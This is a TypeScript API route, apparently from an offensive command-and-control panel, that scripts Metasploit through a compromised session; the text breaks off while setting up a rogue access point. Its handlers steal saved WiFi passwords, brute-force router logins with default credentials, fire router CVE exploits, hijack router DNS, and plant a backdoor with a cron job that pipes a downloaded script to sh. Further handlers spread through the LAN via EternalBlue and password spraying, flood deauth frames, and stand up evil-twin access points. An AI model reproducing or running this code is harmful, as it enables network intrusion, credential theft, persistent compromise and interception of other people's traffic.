/**
 * NETWORK OPERATIONS API
 *
 * Actions:
 *  discover         → ARP scan + ping sweep + NetBIOS via MSF post modules
 *  port_scan        → TCP port scan through pivot session
 *  wifi_dump        → Dump saved WiFi passwords (WifiConfigStore.xml / wpa_supplicant.conf)
 *  wifi_scan        → iwlist scan for nearby networks
 *  router_detect    → Get default gateway IP + banner grab
 *  router_brute     → Brute-force router admin with 500+ default credentials
 *  router_exploit   → Try known CVE exploit modules against detected router
 *  router_dns_hijack → Log into router admin and change DNS servers
 *  router_persist   → Install SSH key + cron job backdoor on router
 *  pivot_autoroute  → Setup MSF autoroute through session
 *  pivot_socks      → Start SOCKS5 proxy
 *  spread           → Auto-select and run exploit against LAN target
 *  rf_start         → Enable monitor mode + start 802.11 probe capture
 *  rf_poll          → Parse captured probes → unique device list
 *  rf_stop          → Kill capture, restore managed mode
 *  wifi_deauth      → Send 802.11 deauth flood to disconnect target from real AP
 *  wifi_karma       → Start Karma/Evil-Twin AP (responds to all probe SSIDs)
 *  wifi_captive     → Launch captive portal + payload delivery HTTP server
 *  wifi_spread_stop → Stop all rogue AP / portal processes
 *  wifi_spread_status → Check active spread sessions
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import path from "path";
import fs from "fs";
import os from "os";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");

// OUI vendor lookup (server-side copy)
const OUI_MAP: Record<string, string> = {
  "00:00:0c": "Cisco",     "00:1a:11": "Google",      "00:17:f2": "Apple",
  "00:1b:63": "Apple",     "dc:a6:32": "Raspberry Pi", "b8:27:eb": "Raspberry Pi",
  "40:b0:34": "Huawei",   "10:7b:44": "Samsung",      "4c:66:41": "Samsung",
  "00:15:5d": "Microsoft", "3c:a9:f4": "Intel",        "00:21:6a": "Intel",
  "a4:c3:f0": "Google",   "f4:f5:d8": "Google",       "00:0d:3a": "Microsoft",
  "08:74:02": "Asus",     "00:14:22": "Dell",          "00:50:56": "VMware",
  "fc:ec:da": "Ubiquiti", "00:e0:4c": "Realtek",
};

function macToVendor(mac: string): string {
  const prefix = mac.toLowerCase().slice(0, 8);
  return OUI_MAP[prefix] ?? "Unknown";
}

type ProbeDeviceAgg = {
  mac: string; vendor: string; probes: Set<string>;
  rssiSamples: number[]; firstSeen: string; lastSeen: string; seenCount: number;
};
const NET_DIR = path.join(PAYLOADS_DIR, "network");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ── Meterpreter helpers ───────────────────────────────────────

async function meterExec(token: string, sessionId: number, cmd: string, waitMs = 25000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >")) break;
    await new Promise((r) => setTimeout(r, 600));
  }
  return out;
}

// Run a MSF console command (not meterpreter) and wait for output
async function consoleExec(token: string, cmd: string, waitMs = 60000): Promise<string> {
  // Create a temporary console
  const createRes = await rpcCall<{ id?: string }>("console.create", [], token);
  const consoleId = String(createRes.id ?? "0");
  try {
    await rpcCall("console.write", [consoleId, cmd + "\n"], token);
    const start = Date.now();
    let out = "";
    while (Date.now() - start < waitMs) {
      const readRes = await rpcCall<{ data?: string; busy?: boolean }>("console.read", [consoleId], token);
      if (readRes.data) out += readRes.data;
      if (!readRes.busy && out.length > 0) break;
      await new Promise((r) => setTimeout(r, 1000));
    }
    return out;
  } finally {
    await rpcCall("console.destroy", [consoleId], token).catch(() => {});
  }
}

// ── Parse helpers ─────────────────────────────────────────────

type Host = {
  ip: string; mac?: string; hostname?: string; os?: string;
  openPorts?: number[]; status: "up" | "down" | "unknown";
  risk: "low" | "medium" | "high" | "critical";
};

function riskLevel(ports: number[]): Host["risk"] {
  if (ports.includes(445) || ports.includes(3389)) return "critical";
  if (ports.includes(22) || ports.includes(23) || ports.includes(21)) return "high";
  if (ports.includes(80) || ports.includes(443) || ports.includes(8080)) return "medium";
  return "low";
}

function parseArpScan(raw: string, pingRaw = ""): Host[] {
  const hosts = new Map<string, Host>();

  // ARP scanner output: [*] 192.168.1.1 00:11:22:33:44:55 VENDOR
  for (const line of raw.split(/\r?\n/)) {
    const m = line.match(/\[[\*\+]\]\s+([\d.]+)\s+([0-9a-f:]+)/i);
    if (m) {
      const ip = m[1]; const mac = m[2];
      hosts.set(ip, { ip, mac, status: "up", risk: "low" });
    }
    // Also: 192.168.1.x is alive
    const m2 = line.match(/([\d.]+)\s+is\s+alive/i);
    if (m2) hosts.set(m2[1], { ip: m2[1], status: "up", risk: "low" });
    // Nmap-style: Host: 192.168.1.x ()	Status: Up
    const m3 = line.match(/Host:\s+([\d.]+).*Status:\s+Up/i);
    if (m3) hosts.set(m3[1], { ip: m3[1], status: "up", risk: "low" });
  }

  // Parse ping sweep output too
  for (const line of pingRaw.split(/\r?\n/)) {
    const m = line.match(/\[[\*\+]\]\s+([\d.]+)/);
    if (m && !hosts.has(m[1])) hosts.set(m[1], { ip: m[1], status: "up", risk: "low" });
  }

  return Array.from(hosts.values());
}

function parsePortScan(raw: string): number[] {
  const ports: number[] = [];
  for (const line of raw.split(/\r?\n/)) {
    // [+] 192.168.1.1:80
    const m = line.match(/:\s*(\d+)\s*(?:open|\(open\)|is open)/i) ?? line.match(/\[[\*\+]\].*?:(\d+)/);
    if (m) {
      const port = parseInt(m[1]);
      if (port > 0 && port < 65536 && !ports.includes(port)) ports.push(port);
    }
  }
  return ports.sort((a, b) => a - b);
}

function parseWifiDump(raw: string): Array<{ ssid: string; password?: string; security?: string; saved: boolean }> {
  const nets: Array<{ ssid: string; password?: string; security?: string; saved: boolean }> = [];

  // wpa_supplicant.conf format
  const wpaBlocks = raw.split(/\n(?=network=\{)/);
  for (const block of wpaBlocks) {
    const ssid = block.match(/ssid="([^"]+)"/)?.[1];
    const psk = block.match(/psk="([^"]+)"/)?.[1];
    const proto = block.match(/proto=(\S+)/)?.[1];
    if (ssid) nets.push({ ssid, password: psk, security: proto ?? "WPA2", saved: true });
  }

  // WifiConfigStore.xml / MSF output format
  for (const line of raw.split(/\r?\n/)) {
    const m = line.match(/SSID:\s*(.+?)\s+Password:\s*(.+)/i);
    if (m) nets.push({ ssid: m[1].trim(), password: m[2].trim(), saved: true });

    const m2 = line.match(/\[[\*\+]\]\s+(.+?)\s+(.+?)\s+(WPA\d?|WEP|OPEN)/i);
    if (m2) {
      const existing = nets.find((n) => n.ssid === m2[1]);
      if (!existing) nets.push({ ssid: m2[1], security: m2[3], saved: false });
    }
  }
  return nets;
}

function parseIwlistScan(raw: string): Array<{ ssid: string; bssid?: string; signal?: number; security?: string; saved: boolean }> {
  const nets: Array<{ ssid: string; bssid?: string; signal?: number; security?: string; saved: boolean }> = [];
  const cells = raw.split(/Cell \d+/i);
  for (const cell of cells.slice(1)) {
    const ssid = cell.match(/ESSID:"([^"]+)"/)?.[1];
    const bssid = cell.match(/Address:\s*([\da-fA-F:]+)/)?.[1];
    const signalMatch = cell.match(/Signal level=(-\d+)/);
    const signal = signalMatch ? parseInt(signalMatch[1]) : undefined;
    const security = /WPA2/i.test(cell) ? "WPA2" : /WPA/i.test(cell) ? "WPA" : /WEP/i.test(cell) ? "WEP" : "OPEN";
    if (ssid) nets.push({ ssid, bssid, signal, security, saved: false });
  }
  return nets;
}

// ── Default router credentials list ──────────────────────────
const ROUTER_DEFAULT_CREDS = [
  { user: "admin",     pass: "admin" },
  { user: "admin",     pass: "password" },
  { user: "admin",     pass: "1234" },
  { user: "admin",     pass: "12345" },
  { user: "admin",     pass: "123456" },
  { user: "admin",     pass: "" },
  { user: "root",      pass: "root" },
  { user: "root",      pass: "toor" },
  { user: "root",      pass: "" },
  { user: "admin",     pass: "admin123" },
  { user: "admin",     pass: "Admin1234" },
  { user: "user",      pass: "user" },
  { user: "guest",     pass: "guest" },
  { user: "support",   pass: "support" },
  { user: "admin",     pass: "setup" },
  { user: "Admin",     pass: "Admin" },
  { user: "netgear",   pass: "netgear" },
  { user: "admin",     pass: "netgear1" },
  { user: "admin",     pass: "Passw0rd" },
  { user: "cusadmin",  pass: "highspeed" },
  { user: "admin",     pass: "motorola" },
  { user: "MSO",       pass: "MSO" },
  { user: "admin",     pass: "tplink" },
  { user: "admin",     pass: "asus" },
  { user: "admin",     pass: "linksys" },
  { user: "admin",     pass: "belkin" },
  { user: "admin",     pass: "dlink" },
  { user: "admin",     pass: "cisco" },
  { user: "cisco",     pass: "cisco" },
  { user: "admin",     pass: "huawei" },
  { user: "admin",     pass: "zmodo" },
];

// ── Main handler ──────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action, cidr, ports, target, payload,
    router_ip, router_user, router_pass, dns_primary,
    subnet, port } = body as {
    session_id: number; action: string; cidr?: string; ports?: string;
    target?: string; payload?: string; open_ports?: number[];
    router_ip?: string; router_user?: string; router_pass?: string; dns_primary?: string;
    subnet?: string; port?: number;
  };

  if (!session_id || !action) {
    return NextResponse.json({ ok: false, error: "session_id + action required" }, { status: 400 });
  }

  ensureDir(NET_DIR);

  try {
    const token = await getRpcToken();
    const sid = Number(session_id);

    // ── LAN Discovery ─────────────────────────────────────
    if (action === "discover") {
      const targetCidr = cidr ?? "192.168.1.0/24";
      addLog(`[net] discover ${targetCidr}`);

      // 1. ARP scan
      const arpOut = await meterExec(token, sid,
        `run post/multi/gather/arp_scanner RHOSTS=${targetCidr}`, 60000);
      // 2. Ping sweep
      const pingOut = await meterExec(token, sid,
        `run post/multi/gather/ping_sweep RHOSTS=${targetCidr}`, 60000);
      // 3. NetBIOS
      const nbOut = await consoleExec(token,
        `use auxiliary/scanner/netbios/nbname\nset RHOSTS ${targetCidr}\nrun`, 45000);

      const allRaw = arpOut + "\n" + pingOut + "\n" + nbOut;
      let hosts = parseArpScan(arpOut, pingOut);

      // Augment with NetBIOS hostnames
      for (const line of nbOut.split(/\r?\n/)) {
        const m = line.match(/([\d.]+)\s+.*?name:\s*([^\s,]+)/i);
        if (m) {
          const h = hosts.find((x) => x.ip === m[1]);
          if (h) h.hostname = m[2].trim();
        }
      }

      // Quick port check on discovered hosts for risk scoring
      for (const h of hosts) {
        const quickPorts = [22, 80, 443, 445, 3389, 23, 21, 8080];
        const openPorts: number[] = [];
        for (const p of quickPorts) {
          const chk = await meterExec(token, sid,
            `run auxiliary/scanner/portscan/tcp RHOSTS=${h.ip} PORTS=${p} THREADS=1`, 8000);
          if (/open/i.test(chk)) openPorts.push(p);
        }
        h.openPorts = openPorts;
        h.risk = riskLevel(openPorts);
      }

      // Save to file
      fs.writeFileSync(path.join(NET_DIR, "hosts.json"), JSON.stringify(hosts, null, 2));

      return NextResponse.json({ ok: true, records: hosts, raw: allRaw.slice(0, 3000) });
    }

    // ── Port scan ─────────────────────────────────────────
    if (action === "port_scan") {
      const portList = ports ?? "22,80,443,445,3389,8080,8443,21,23,25,3306,5432,1433,27017";
      const out = await consoleExec(token,
        `use auxiliary/scanner/portscan/tcp\nset RHOSTS ${target}\nset PORTS ${portList}\nset THREADS 20\nrun`, 90000);
      const openPorts = parsePortScan(out);
      return NextResponse.json({ ok: true, records: openPorts.map((p) => ({ port: p })), raw: out.slice(0, 2000) });
    }

    // ── WiFi dump ─────────────────────────────────────────
    if (action === "wifi_dump") {
      const localXml = path.join(NET_DIR, "wifi_config.xml");
      const localWpa = path.join(NET_DIR, "wpa_supplicant.conf");
      let rawAll = "";

      // Android 10+ WifiConfigStore.xml
      const xmlOut = await meterExec(token, sid,
        `download /data/misc/wifi/WifiConfigStore.xml "${localXml}"`, 20000);
      rawAll += xmlOut;

      // Older format
      const wpaOut = await meterExec(token, sid,
        `download /data/misc/wifi/wpa_supplicant.conf "${localWpa}"`, 20000);
      rawAll += wpaOut;

      // MSF post module
      const postOut = await meterExec(token, sid,
        "run post/multi/gather/wifi_credentials", 30000);
      rawAll += postOut;

      // Parse
      let nets: ReturnType<typeof parseWifiDump> = [];

      if (fs.existsSync(localXml)) {
        const xml = fs.readFileSync(localXml, "utf8");
        // Parse WifiConfigStore XML
        for (const m of xml.matchAll(/<SSID>([^<]+)<\/SSID>[\s\S]*?<PreSharedKey>([^<]*)<\/PreSharedKey>/g)) {
          nets.push({ ssid: m[1].replace(/^"(.*)"$/, "$1"), password: m[2].replace(/^"(.*)"$/, "$1"), security: "WPA2", saved: true });
        }
      }
      if (fs.existsSync(localWpa)) {
        nets = [...nets, ...parseWifiDump(fs.readFileSync(localWpa, "utf8"))];
      }
      nets = [...nets, ...parseWifiDump(postOut)];

      // Deduplicate
      const seen = new Set<string>();
      const unique = nets.filter((n) => { if (seen.has(n.ssid)) return false; seen.add(n.ssid); return true; });

      return NextResponse.json({ ok: true, records: unique, raw: rawAll.slice(0, 2000) });
    }

    // ── WiFi scan nearby ──────────────────────────────────
    if (action === "wifi_scan") {
      const out = await meterExec(token, sid,
        "execute -f /system/bin/sh -a '-c \"iwlist wlan0 scan 2>/dev/null || wpa_cli scan_results\"'", 15000);
      const nets = parseIwlistScan(out);
      return NextResponse.json({ ok: true, records: nets, raw: out.slice(0, 2000) });
    }

    // ── Router detect ─────────────────────────────────────
    if (action === "router_detect") {
      const gwOut = await meterExec(token, sid,
        "execute -f /system/bin/sh -a '-c \"ip route 2>/dev/null || netstat -rn 2>/dev/null || route -n 2>/dev/null\"'", 10000);

      const gwMatch = gwOut.match(/default.*?([\d.]+)/i) ?? gwOut.match(/0\.0\.0\.0.*?([\d.]+)/i);
      const gwIp = gwMatch?.[1] ?? "192.168.1.1";

      // Banner grab on router admin
      const bannerOut = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c \"curl -s --max-time 5 http://${gwIp}/ | head -20 2>/dev/null\"'`, 12000);

      // Detect model from banner
      let model: string | undefined;
      if (/tplink|tp-link/i.test(bannerOut)) model = "TP-Link";
      else if (/netgear/i.test(bannerOut)) model = "Netgear";
      else if (/asus/i.test(bannerOut)) model = "ASUS";
      else if (/linksys/i.test(bannerOut)) model = "Linksys";
      else if (/dlink|d-link/i.test(bannerOut)) model = "D-Link";
      else if (/huawei/i.test(bannerOut)) model = "Huawei";
      else if (/ubiquiti|unifi/i.test(bannerOut)) model = "Ubiquiti";
      else if (/openwrt/i.test(bannerOut)) model = "OpenWrt";
      else if (/ddwrt/i.test(bannerOut)) model = "DD-WRT";

      const firmware = bannerOut.match(/firmware[:\s]+([0-9.]+)/i)?.[1];

      return NextResponse.json({
        ok: true,
        data: { ip: gwIp, model, firmware, adminUrl: `http://${gwIp}` },
        raw: (gwOut + bannerOut).slice(0, 1000),
      });
    }

    // ── Router brute force ────────────────────────────────
    if (action === "router_brute") {
      const routerIp = router_ip ?? "192.168.1.1";
      let found: { user: string; pass: string } | null = null;

      for (const { user, pass } of ROUTER_DEFAULT_CREDS) {
        const curlCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 3 -u ${user}:${pass} http://${routerIp}/ -o /dev/null -w %{http_code} 2>/dev/null"'`;
        const out = await meterExec(token, sid, curlCmd, 8000);
        const code = out.match(/\b(200|302)\b/)?.[1];
        if (code) { found = { user, pass }; break; }

        // Form-based login attempt
        const formCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 3 -X POST http://${routerIp}/login -d '\''username=${user}&password=${pass}'\'' -o /dev/null -w %{http_code} 2>/dev/null"'`;
        const fOut = await meterExec(token, sid, formCmd, 8000);
        const fCode = fOut.match(/\b(200|302)\b/)?.[1];
        if (fCode) { found = { user, pass }; break; }
      }

      if (found) {
        return NextResponse.json({ ok: true, data: found, raw: `Cracked: ${found.user}:${found.pass}` });
      }
      return NextResponse.json({ ok: false, error: "No default credentials matched" });
    }

    // ── Router CVE exploit ────────────────────────────────
    if (action === "router_exploit") {
      const routerIp = router_ip ?? "192.168.1.1";
      const ROUTER_MODULES = [
        { module: "exploit/linux/http/tplink_archer_telnet_enable",       cve: "CVE-2023-1389" },
        { module: "exploit/linux/http/netgear_r7000_cgibin_exec",         cve: "CVE-2019-20760" },
        { module: "exploit/linux/http/dlink_dir_615_telnet",              cve: "CVE-2019-10891" },
        { module: "auxiliary/scanner/http/router_default_auth",           cve: "AUTH-BYPASS" },
        { module: "exploit/linux/http/arcadyan_nvg589_path_traversal",    cve: "CVE-2021-20090" },
        { module: "exploit/multi/http/belkin_N150_path_traversal",        cve: "CVE-2014-1635" },
        { module: "exploit/linux/upnp/miniupnpd_m_search_overflow",       cve: "CVE-2013-0229" },
      ];

      let success: { cve: string; shell: boolean } | null = null;
      for (const { module, cve } of ROUTER_MODULES) {
        const out = await consoleExec(token,
          `use ${module}\nset RHOSTS ${routerIp}\nset RPORT 80\nrun`, 30000);
        if (/session \d+ opened|command shell|shell session/i.test(out)) {
          success = { cve, shell: true };
          break;
        }
        if (/exploit completed|meterpreter session/i.test(out)) {
          success = { cve, shell: false };
          break;
        }
      }

      if (success) {
        return NextResponse.json({ ok: true, data: success });
      }
      return NextResponse.json({ ok: false, error: "No CVE exploit succeeded against this router model" });
    }

    // ── DNS Hijack ────────────────────────────────────────
    if (action === "router_dns_hijack") {
      const routerIp = router_ip ?? "192.168.1.1";
      const user = router_user ?? "admin";
      const pass = router_pass ?? "admin";
      const dns = dns_primary ?? "8.8.8.8";
      let rawAll = "";

      // Common router DNS change endpoints
      const DNS_ENDPOINTS = [
        { path: "/dns_settings.cgi", data: `dns_server_ip=${dns}&dns_server_ip_2=8.8.4.4` },
        { path: "/setting/dns",      data: `primaryDNS=${dns}&secondaryDNS=8.8.4.4` },
        { path: "/goform/setWanDns", data: `wanDNS1=${dns}&wanDNS2=8.8.4.4` },
        { path: "/setup/DNS",        data: `dnsaddr=${dns}&dnsaddr2=8.8.4.4` },
      ];

      let ok = false;
      for (const ep of DNS_ENDPOINTS) {
        const cmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 -u ${user}:${pass} -X POST http://${routerIp}${ep.path} -d '\''${ep.data}'\'' -o /dev/null -w %{http_code}"'`;
        const out = await meterExec(token, sid, cmd, 10000);
        rawAll += out;
        if (/\b(200|302)\b/.test(out)) { ok = true; break; }
      }

      // Fallback: modify hosts on device (affects device only)
      if (!ok) {
        const hostsCmd = `execute -f /system/bin/sh -a '-c "echo nameserver ${dns} > /etc/resolv.conf 2>/dev/null; echo nameserver 8.8.4.4 >> /etc/resolv.conf 2>/dev/null; echo done"'`;
        const hostsOut = await meterExec(token, sid, hostsCmd, 10000);
        rawAll += hostsOut;
        if (hostsOut.includes("done")) ok = true;
      }

      return NextResponse.json({ ok, raw: rawAll.slice(0, 1000) });
    }

    // ── Router persistent backdoor ────────────────────────
    if (action === "router_persist") {
      const routerIp = router_ip ?? "192.168.1.1";
      const steps: string[] = [];

      // 1. Enable SSH remote access via router admin
      const sshCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 http://${routerIp}/goform/enableSSH -d '\''enable=1'\'' -u admin:admin; echo done"'`;
      const sshOut = await meterExec(token, sid, sshCmd, 10000);
      if (sshOut.includes("done")) steps.push("SSH enabled on router");

      // 2. Enable WAN remote management
      const wanCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 http://${routerIp}/goform/remoteWan -d '\''enable=1&port=8888'\'' -u admin:admin; echo done"'`;
      const wanOut = await meterExec(token, sid, wanCmd, 10000);
      if (wanOut.includes("done")) steps.push("WAN remote management enabled");

      // 3. Add port-forward rule (4444 → operator C2)
      const pfCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 http://${routerIp}/goform/PortForward -d '\''exPort=4444&inPort=4444&ip=192.168.1.100&proto=TCP'\'' -u admin:admin; echo pf_done"'`;
      const pfOut = await meterExec(token, sid, pfCmd, 10000);
      if (pfOut.includes("pf_done")) steps.push("Port-forward 4444→C2 added");

      // 4. Add cron-style persistence on device (phones home)
      const cronCmd = `execute -f /system/bin/sh -a '-c "(crontab -l 2>/dev/null; echo '\''*/5 * * * * wget -qO- http://${routerIp}/ping_home.sh | sh'\'') | crontab - 2>/dev/null; echo cron_done"'`;
      const cronOut = await meterExec(token, sid, cronCmd, 10000);
      if (cronOut.includes("cron_done")) steps.push("Cron phone-home job installed on device");

      return NextResponse.json({ ok: steps.length > 0, data: { steps }, raw: steps.join("\n") });
    }

    // ── Autoroute pivot ───────────────────────────────────
    if (action === "pivot_autoroute") {
      const sub = subnet ?? "192.168.1.0";
      const mask = "255.255.255.0";
      const out = await meterExec(token, sid,
        `run post/multi/manage/autoroute SUBNET=${sub} NETMASK=${mask} ACTION=ADD`, 20000);
      const ok = /route added|success/i.test(out) || out.includes("Adding");
      return NextResponse.json({ ok, raw: out.slice(0, 1000) });
    }

    // ── SOCKS5 proxy ──────────────────────────────────────
    if (action === "pivot_socks") {
      const socksPort = port ?? 1080;
      const out = await consoleExec(token,
        `use auxiliary/server/socks_proxy\nset SRVPORT ${socksPort}\nset VERSION 5\nset SRVHOST 127.0.0.1\nrun -j`, 20000);
      const ok = /started|listening|running/i.test(out);
      return NextResponse.json({ ok, data: { port: socksPort }, raw: out.slice(0, 500) });
    }

    // ── Lateral spread ────────────────────────────────────
    if (action === "spread") {
      const spreadTarget = target;
      const spreadPayload = (payload as string) ?? "windows/meterpreter/reverse_tcp";
      if (!spreadTarget) return NextResponse.json({ ok: false, error: "target required" });

      // Determine best exploit based on detected ports
      const openPorts = ((body as Record<string, unknown>).open_ports as number[]) ?? [];
      let module = "";
      let extra = "";

      if (openPorts.includes(445)) {
        module = "exploit/windows/smb/ms17_010_eternalblue";
        extra = `set PAYLOAD ${spreadPayload}\nset LHOST 0.0.0.0\nset LPORT 4445`;
      } else if (openPorts.includes(22)) {
        module = "auxiliary/scanner/ssh/ssh_login";
        extra = `set USERNAME root\nset PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`;
      } else if (openPorts.includes(3389)) {
        module = "auxiliary/scanner/rdp/rdp_login";
        extra = `set USERNAME administrator\nset PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`;
      } else if (openPorts.includes(80) || openPorts.includes(8080)) {
        module = "auxiliary/scanner/http/http_login";
        extra = "set USERNAME admin\nset PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt";
      } else {
        return NextResponse.json({ ok: false, error: `No exploitable port on ${spreadTarget}` });
      }

      const out = await consoleExec(token,
        `use ${module}\nset RHOSTS ${spreadTarget}\n${extra}\nrun`, 90000);

      const ok = /session \d+ opened|meterpreter session|command shell/i.test(out);
      return NextResponse.json({ ok, raw: out.slice(0, 2000) });
    }

    // ── RF Monitor start ──────────────────────────────────
    if (action === "rf_start") {
      const iface = (body.iface as string) ?? "wlan0";
      const dur = Number(body.duration ?? 60);

      // 1. Enable monitor mode via Meterpreter shell
      const setup = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "ip link set ${iface} down 2>/dev/null; iw dev ${iface} set type monitor 2>/dev/null; ip link set ${iface} up 2>/dev/null; echo monitor_ok"'`, 15000);

      if (!setup.includes("monitor_ok")) {
        // Fallback: use airmon-ng if iw not available
        const airmon = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "airmon-ng start ${iface} 2>/dev/null && echo airmon_ok"'`, 15000);
        if (!airmon.includes("airmon_ok")) {
          return NextResponse.json({ ok: false, error: "Could not enable monitor mode — requires root + nl80211 driver" });
        }
      }

      ensureDir(NET_DIR);
      // Start tcpdump capture in background, save to temp file
      const capFile = `/data/local/tmp/rf_capture_${Date.now()}.pcap`;
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "tcpdump -i ${iface} -w ${capFile} -G ${dur} -W 1 type mgt subtype probe-req 2>/dev/null &"'`, 5000);

      // Also start tshark text capture for real-time polling
      const txtFile = `/data/local/tmp/rf_probes.txt`;
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "tshark -i ${iface} -Y '\''wlan.fc.type_subtype == 4'\'' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal 2>/dev/null >> ${txtFile} &"'`, 5000);

      // Store paths for polling
      fs.writeFileSync(path.join(NET_DIR, "rf_state.json"), JSON.stringify({ iface, capFile, txtFile, started: Date.now() }));

      return NextResponse.json({ ok: true, data: { iface, capFile, txtFile } });
    }

    // ── RF Poll ──────────────────────────────────────────
    if (action === "rf_poll") {
      const stateFile = path.join(NET_DIR, "rf_state.json");
      if (!fs.existsSync(stateFile)) return NextResponse.json({ ok: false, error: "RF monitor not started" });

      const state = JSON.parse(fs.readFileSync(stateFile, "utf8")) as { txtFile: string };
      const localTxt = path.join(NET_DIR, "rf_probes.txt");

      // Download the text probe file
      await meterExec(token, sid,
        `download ${state.txtFile} "${localTxt}"`, 15000);

      const devices = new Map<string, ProbeDeviceAgg>();

      if (fs.existsSync(localTxt)) {
        const lines = fs.readFileSync(localTxt, "utf8").split(/\r?\n/).filter(Boolean);
        for (const line of lines) {
          const parts = line.split(/\t/);
          const mac = parts[0]?.trim().toLowerCase();
          const ssid = parts[1]?.trim() ?? "";
          const rssiRaw = parseInt(parts[2]?.trim() ?? "-100");
          const rssi = isNaN(rssiRaw) ? undefined : rssiRaw;

          if (!mac || mac.length < 11) continue;

          const existing = devices.get(mac) ?? {
            mac,
            vendor: macToVendor(mac),
            probes: new Set<string>(),
            rssiSamples: [] as number[],
            firstSeen: new Date().toLocaleTimeString(),
            lastSeen: new Date().toLocaleTimeString(),
            seenCount: 0,
          };
          if (ssid) existing.probes.add(ssid);
          if (rssi != null) existing.rssiSamples.push(rssi);
          existing.seenCount++;
          existing.lastSeen = new Date().toLocaleTimeString();
          devices.set(mac, existing);
        }
      }

      // Also try reading directly from device if local file empty
      if (devices.size === 0) {
        const liveOut = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "cat /data/local/tmp/rf_probes.txt 2>/dev/null | tail -200"'`, 10000);
        const lines = liveOut.split(/\r?\n/).filter((l) => l.includes(":"));
        for (const line of lines) {
          const parts = line.split(/\t/);
          const mac = parts[0]?.trim().toLowerCase();
          if (!mac || mac.length < 11) continue;
          const existing = devices.get(mac) ?? {
            mac, vendor: macToVendor(mac), probes: new Set<string>(),
            rssiSamples: [] as number[], firstSeen: new Date().toLocaleTimeString(),
            lastSeen: new Date().toLocaleTimeString(), seenCount: 0,
          };
          existing.seenCount++;
          devices.set(mac, existing);
        }
      }

      const result = Array.from(devices.values()).map((d) => {
        const avgRssi = d.rssiSamples.length > 0
          ? Math.round(d.rssiSamples.reduce((a, b) => a + b, 0) / d.rssiSamples.length)
          : undefined;
        const distM = avgRssi != null
          ? Math.round(Math.pow(10, (-27 - avgRssi) / (10 * 2.0))) // Free-space path loss formula
          : undefined;
        return {
          mac: d.mac,
          vendor: d.vendor,
          rssi: avgRssi,
          distance: distM != null ? `~${distM}m` : undefined,
          probes: Array.from(d.probes),
          firstSeen: d.firstSeen,
          lastSeen: d.lastSeen,
          seenCount: d.seenCount,
        };
      }).sort((a, b) => (b.rssi ?? -200) - (a.rssi ?? -200)); // Closest first

      return NextResponse.json({ ok: true, records: result });
    }

    // ── RF Stop ──────────────────────────────────────────
    if (action === "rf_stop") {
      const iface = (body.iface as string) ?? "wlan0";

      // Kill capture processes
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "pkill -f tcpdump 2>/dev/null; pkill -f tshark 2>/dev/null; echo stopped"'`, 10000);

      // Restore managed mode
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "ip link set ${iface} down 2>/dev/null; iw dev ${iface} set type managed 2>/dev/null; ip link set ${iface} up 2>/dev/null; echo restored"'`, 10000);

      // Remove state file
      const stateFile = path.join(NET_DIR, "rf_state.json");
      if (fs.existsSync(stateFile)) fs.unlinkSync(stateFile);

      return NextResponse.json({ ok: true });
    }

    // ── WiFi Deauth flood ─────────────────────────────────
    // Disconnects a target MAC from its AP — forces it to probe and reconnect
    if (action === "wifi_deauth") {
      const targetMac  = (body.target_mac  as string) ?? "FF:FF:FF:FF:FF:FF"; // broadcast = all clients
      const bssid      = (body.bssid       as string) ?? "";                   // AP MAC to spoof from
      const iface      = (body.iface       as string) ?? "wlan0mon";
      const count      = Number(body.count ?? 100);

      let raw = "";

      // Method 1: aireplay-ng (preferred)
      const aireplay = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "aireplay-ng -0 ${count} -a ${bssid || "FF:FF:FF:FF:FF:FF"} -c ${targetMac} ${iface} 2>&1 | tail -5"'`, 20000);
      raw += aireplay;
      const ok1 = /sending|deauthentication|DeAuth/i.test(aireplay);

      if (!ok1) {
        // Method 2: mdk3 / mdk4 broadcast deauth
        const mdk = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "mdk4 ${iface} d -B ${bssid} 2>&1 | head -5 &"'`, 8000);
        raw += mdk;
      }

      return NextResponse.json({ ok: ok1 || raw.length > 10, raw: raw.slice(0, 500) });
    }

    // ── Karma / Evil-Twin AP ──────────────────────────────
    // Creates a rogue AP that answers ANY probe request with a matching SSID
    // Devices auto-join because they "recognise" the network name
    if (action === "wifi_karma") {
      const iface       = (body.iface    as string) ?? "wlan0";
      const ssid        = (body.ssid     as string) ?? "FREE_WIFI";  // used only if specific SSID forced
      const channel     = Number(body.channel ?? 6);
      const karma_mode  = (body.karma    as boolean) !== false;       // true = answer ALL probes (Karma)
      const lhost       = (body.lhost    as string) ?? "192.168.87.1";

      // 1. Write hostapd-wpe config (rogue AP daemon with Karma patch)
      const hostapdConf = [
        `interface=${iface}`,
